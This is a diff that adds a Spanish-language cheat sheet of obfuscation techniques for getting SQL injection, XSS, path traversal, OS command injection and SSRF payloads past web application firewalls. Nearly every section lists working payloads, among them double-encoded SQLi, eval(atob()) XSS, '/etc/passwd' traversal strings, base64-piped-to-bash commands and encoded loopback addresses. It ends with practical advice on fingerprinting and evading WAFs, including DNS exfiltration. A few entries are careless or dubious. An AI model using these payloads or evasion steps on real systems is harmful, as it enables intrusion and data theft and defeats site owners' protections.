@@ -1,0 +1,377 @@
+===============================================================================
+        TÉCNICAS DE OFUSCACIÓN PARA EVADIR WAFs (Web Application Firewalls)
+===============================================================================
+
+Este documento explica métodos de ofuscación aplicables a diferentes tipos de
+ataques: SQLi, XSS, LFI, Command Injection, SSRF, etc. Cada técnica incluye:
+- Nombre de la técnica
+- Descripción de cómo funciona
+- Contexto de uso (qué motor/filtro intenta engañar)
+- Ejemplos prácticos
+
+================================================================================
+1. INYECCIÓN SQL (SQLi)
+================================================================================
+
+1.1. Comentarios anidados / condicionales (MySQL)
+--------------------------------------------------
+Principio: MySQL permite comentarios de la forma /*! ... */ que se ejecutan
+como código SQL normal si la versión es igual o superior a la indicada.
+También se pueden anidar comentarios para romper firmas.
+
+Contexto: WAFs que bloquean palabras clave como "OR" o "UNION".
+
+Ejemplos:
+  ' /*!50000OR*/ 1=1 --
+  ' /*!UNION*/ /*!SELECT*/ NULL --
+  ' OR 1=1/**/AND/**/SLEEP(5) --
+
+1.2. Doble codificación URL
+----------------------------
+Principio: Algunos WAFs decodifican la petición solo una vez. Si codificas dos
+veces (ej. %2527 = %27 = '), el WAF puede ver caracteres inocentes y el
+servidor lo decodificará correctamente.
+
+Contexto: WAFs que no realizan decodificación recursiva.
+
+Ejemplos:
+  %2527%2520OR%2520%25271%2527%2520%253D%2520%25271   (' OR '1'='1)
+  %2553%2545%254c%2545%2543%2554 (SELECT)
+
+1.3. Inyección mediante concatenación de cadenas
+-------------------------------------------------
+Principio: Dividir una palabra clave en varias partes que se concatenan.
+Diferentes motores tienen operadores de concatenación: ||, CONCAT(), +.
+
+Contexto: WAFs que bloquean palabras completas pero no fragmentos.
+
+Ejemplos:
+  ' OR 'a'||'d'||'m'||'i'||'n' = 'admin' (PostgreSQL)
+  ' OR CONCAT('ad','min') = 'admin' (MySQL)
+  ' OR 'ad'+'min' = 'admin' (MSSQL)
+
+1.4. Uso de caracteres de control (tab, newline, carriage return)
+-------------------------------------------------------------------
+Principio: Muchos WAFs tienen firmas que esperan espacios entre palabras.
+Insertar caracteres de control (tab %09, newline %0a, carriage return %0d)
+puede romper la firma sin afectar la ejecución en SQL.
+
+Contexto: WAFs con reglas estrictas sobre espacios.
+
+Ejemplos:
+  '%0aOR%0a1=1--
+  '/**/OR/**/1=1--   (comentario multilínea)
+  ' OR%091=1--
+
+1.5. Uso de case alternado
+---------------------------
+Principio: Muchos WAFs buscan palabras en mayúsculas o minúsculas, pero no
+todas las mezclas. SQL es case-insensitive para palabras clave.
+
+Contexto: WAFs con detección simple de cadenas en mayúscula.
+
+Ejemplo:
+  ' oR 1=1 --
+  ' UnIoN SeLeCt NULL --
+
+1.6. Evasión de comillas
+------------------------
+Principio: Si el WAF escapa o bloquea comillas simples, se pueden usar
+representaciones alternativas (hex, dobles comillas, backslashes).
+
+Contexto: Filtros que reemplazan ' por '' o \'.
+
+Ejemplos:
+  ' OR 1=1 --  ->  \x27 OR 1=1 -- (hex)
+  ' OR 1=1 --  ->  %27 OR 1=1 --
+  " OR 1=1 --  (si las comillas dobles no están filtradas)
+
+================================================================================
+2. CROSS-SITE SCRIPTING (XSS)
+================================================================================
+
+2.1. Codificación HTML (decimal y hexadecimal)
+-----------------------------------------------
+Principio: Los navegadores interpretan entidades HTML como &#97; = 'a'.
+El WAF puede no decodificarlas antes de analizar.
+
+Contexto: WAFs que inspeccionan el payload crudo.
+
+Ejemplo:
+  <img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+  <svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+2.2. Uso de backticks en lugar de paréntesis
+---------------------------------------------
+Principio: JavaScript permite backticks para llamar a funciones (alert`1`).
+Los WAFs suelen buscar alert(1) pero no alert`1`.
+
+Contexto: WAFs con reglas que detectan patrones con paréntesis.
+
+Ejemplo:
+  <script>alert`1`</script>
+  <body onload=alert`1`>
+
+2.3. Ofuscación con eval y base64
+----------------------------------
+Principio: Ocultar el payload dentro de una cadena base64 que se decodifica
+y ejecuta con eval. El WAF solo verá caracteres alfanuméricos y '='.
+
+Contexto: WAFs que no decodifican base64 ni evalúan eval().
+
+Ejemplo:
+  <script>eval(atob('YWxlcnQoMSk='))</script>
+  <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+
+2.4. Fragmentación de cadenas
+-------------------------------
+Principio: Dividir la función maliciosa en partes que se concatenan en tiempo
+de ejecución.
+
+Contexto: WAFs con detección estática de palabras clave.
+
+Ejemplo:
+  <script>var a='al';var b='ert(1)';eval(a+b)</script>
+  <script>window['al'+'ert'](1)</script>
+
+2.5. Uso de eventos no comunes
+-------------------------------
+Principio: Existen muchos eventos HTML que ejecutan JavaScript, algunos poco
+conocidos y no bloqueados por WAFs genéricos.
+
+Contexto: WAFs que solo bloquean onload, onerror, onclick.
+
+Ejemplos:
+  <details open ontoggle=alert(1)>
+  <svg><animate onbegin=alert(1) attributeName=x>
+  <marquee onstart=alert(1)>
+
+2.6. Inyección sin etiquetas
+-----------------------------
+Principio: En contextos donde el input se inserta dentro de un atributo
+HTML, no se necesitan etiquetas.
+
+Contexto: WAFs que bloquean <script> y <img> pero no cierran comillas.
+
+Ejemplo:
+  " onmouseover="alert(1)   (si el input va dentro de un atributo)
+  ' onfocus='alert(1)'
+
+================================================================================
+3. LOCAL FILE INCLUSION (LFI) / PATH TRAVERSAL
+================================================================================
+
+3.1. Doble codificación URL
+----------------------------
+Principio: Similar a SQLi, codificar dos veces los puntos y barras.
+
+Contexto: WAFs que decodifican solo una vez.
+
+Ejemplos:
+  ..%252f..%252f..%252fetc%252fpasswd
+  %252e%252e%252f%252e%252e%252f%252e%252e%252f
+
+3.2. Uso de ..; en servidores IIS (Windows)
+--------------------------------------------
+Principio: En versiones antiguas de IIS, la secuencia ..; permite salir de
+directorios sin ser detectada por filtros simples.
+
+Contexto: WAFs que no consideran el punto y coma como separador.
+
+Ejemplo:
+  ..;..;..;..;Windows\win.ini
+
+3.3. Fragmentación con ./ y slash inversos
+-------------------------------------------
+Principio: Mezclar barras normales (/) y barras inversas (\) junto con ./.
+Algunos WAFs normalizan los paths de forma incompleta.
+
+Ejemplos:
+  ....//....//....//....//etc/passwd
+  ..././..././..././etc/passwd
+  ..\..\..\..\etc\passwd
+
+3.4. Uso de null byte (%00) y otros caracteres de terminación
+--------------------------------------------------------------
+Principio: En lenguajes antiguos (PHP <5.3), un null byte terminaba la cadena
+y todo lo que seguía era ignorado. Útil para añadir extensiones forzadas.
+
+Contexto: WAFs que permiten la extensión pero el servidor la ignora.
+
+Ejemplo:
+  ../../../../etc/passwd%00.jpg
+  ../../../../etc/passwd%00
+
+3.5. Uso de wrapper PHP ofuscados
+---------------------------------
+Principio: Los wrappers php://filter pueden encadenarse y combinarse con
+codificación para evadir la detección.
+
+Contexto: WAFs que bloquean "php://filter" simple.
+
+Ejemplos:
+  php://filter/convert.base64-encode|convert.base64-decode/resource=file
+  php://filter/convert.iconv.utf-8.utf-16/resource=flag.txt
+
+================================================================================
+4. COMMAND INJECTION (OS CMD)
+================================================================================
+
+4.1. Uso de variables de entorno (Linux)
+-----------------------------------------
+Principio: ${IFS} representa un espacio, ${PATH:0:1} puede ser '/' o '.'.
+Así se evitan espacios y caracteres literales.
+
+Contexto: WAFs que bloquean espacios o caracteres como ';', '|', '&'.
+
+Ejemplos:
+  id${IFS}-a
+  ${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}id
+
+4.2. Uso de comillas invertidas y sustitución de comandos
+----------------------------------------------------------
+Principio: Anidar comandos dentro de ` ` o $() para que la salida sea evaluada.
+
+Contexto: WAFs que no detectan inyección cuando el comando está dentro de
+sustituciones.
+
+Ejemplos:
+  `echo id`
+  $(echo id)
+
+4.3. Concatenación de cadenas
+-------------------------------
+Principio: Dividir el comando en fragmentos y unirlos con comillas.
+
+Contexto: WAFs que bloquean comandos enteros.
+
+Ejemplos:
+  c"a"t /etc/passwd
+  c'a't /etc/passwd
+  w'h'o'am'i
+
+4.4. Codificación hexadecimal / base64
+---------------------------------------
+Principio: Ejecutar un comando codificado que el WAF no reconoce.
+
+Contexto: WAFs que inspeccionan caracteres ASCII pero no ejecutan decodificación.
+
+Ejemplos:
+  printf "\x69\x64" | bash
+  echo "aWQ=" | base64 -d | bash
+
+4.5. Bypass de espacios con ${IFS} o < y >
+------------------------------------------
+Principio: Usar variables de espacio o redireccionadores para evitar espacios
+literales.
+
+Ejemplos:
+  id${IFS}-a
+  cat</etc/passwd
+  {cat,/etc/passwd}
+
+================================================================================
+5. SERVER-SIDE REQUEST FORGERY (SSRF)
+================================================================================
+
+5.1. Uso de dominios alternativos y redirecciones
+--------------------------------------------------
+Principio: Usar servicios como localhost.pics (resuelve a 127.0.0.1) o
+redirecciones HTTP que el WAF no sigue.
+
+Contexto: WAFs que bloquean IPs internas literales (127.0.0.1, 10.0.0.1) pero
+no dominios que resuelven a esas IPs.
+
+Ejemplos:
+  http://localhost.pics
+  http://localtest.me
+  http://0.0.0.0
+  http://[::1]  (IPv6 loopback)
+
+5.2. Codificación decimal / octal / hexadecimal de IPs
+-------------------------------------------------------
+Principio: Las IPs pueden representarse en diferentes formatos (decimal,
+octal, hex) que el WAF puede no normalizar.
+
+Contexto: WAFs que bloquean direcciones IP en formato decimal con puntos.
+
+Ejemplos:
+  2130706433  (decimal de 127.0.0.1)
+  0x7f000001  (hexadecimal)
+  0177.0.0.01 (octal)
+
+5.3. Uso de fragmentos de URL (#) y parámetros
+------------------------------------------------
+Principio: Todo lo que va después de # no se envía al servidor, pero puede
+inducir a error al WAF si analiza la URL completa.
+
+Contexto: WAFs que no manejan bien el fragmento.
+
+Ejemplo:
+  http://internal-service#@attacker.com/ (interpretado como internal-service,
+  pero el WAF puede ver attacker.com)
+
+================================================================================
+6. OFUSCACIÓN GENERAL (aplicable a múltiples técnicas)
+================================================================================
+
+6.1. Codificación en capas (recursiva)
+---------------------------------------
+Principio: Aplicar múltiples capas de codificación (URL, base64, HTML) hasta
+que el WAF no reconozca el payload, pero el servidor final lo decodifique
+correctamente.
+
+Contexto: WAFs con decodificación limitada.
+
+Ejemplo (XSS):
+  %3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
+  (después de una decodificación se convierte en <script>alert(1)</script>)
+
+6.2. Uso de caracteres Unicode / homógrafos
+--------------------------------------------
+Principio: Algunos caracteres Unicode se parecen a ASCII pero tienen códigos
+diferentes. El WAF puede no normalizar Unicode.
+
+Contexto: WAFs sin normalización Unicode completa.
+
+Ejemplo (en SQLi):
+  ' ŌŘ 1=1 -- (donde ŌŘ podría ser interpretado como OR después de normalización)
+
+6.3. Fragmentación y reensamblaje con `concat` o arrays
+--------------------------------------------------------
+Técnica utilizada especialmente en JavaScript (XSS) y SQL.
+
+Ejemplos:
+  // JavaScript
+  var s = ['al','ert']; s[0]+s[1] + '(1)'; eval?
+
+  // SQL (MySQL)
+  SELECT CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74)  (SELECT)
+
+6.4. Cambio de método HTTP
+---------------------------
+Principio: A veces el WAF solo inspecciona GET o POST, pero no otros métodos
+como PUT, PATCH, DELETE. Se puede enviar el payload por un método no esperado.
+
+Contexto: WAFs configurados solo para métodos comunes.
+
+Ejemplo:  PUT /vulnerable.php?param=' OR 1=1 --
+
+================================================================================
+7. RECOMENDACIONES PRÁCTICAS PARA EVADIR WAFs
+================================================================================
+
+- **Primero identifica el WAF**: usa herramientas como whatwaf, wafw00f.
+- **Prueba codificaciones capa por capa** (URL -> HTML -> base64).
+- **Observa qué caracteres están bloqueados** (espacios, paréntesis, comillas).
+- **Combina técnicas**: concatenación + comentarios anidados + case alternado.
+- **Usa time-based en lugar de error-based** (el WAF suele bloquear errores).
+- **Si el WAF normaliza espacios** (ej. reemplaza %20 por espacio), prueba
+  otros separadores como %09, %0a, %0d, %00.
+- **Ataques fuera de banda (OOB)** suelen ser menos detectados: DNS exfiltración
+  en SQLi, SSRF a servicios externos.
+
+===============================================================================
+Este documento es una referencia continua. Las técnicas evolucionan, pero los
+principios (ofuscación, codificación, fragmentación) permanecen.
+===============================================================================
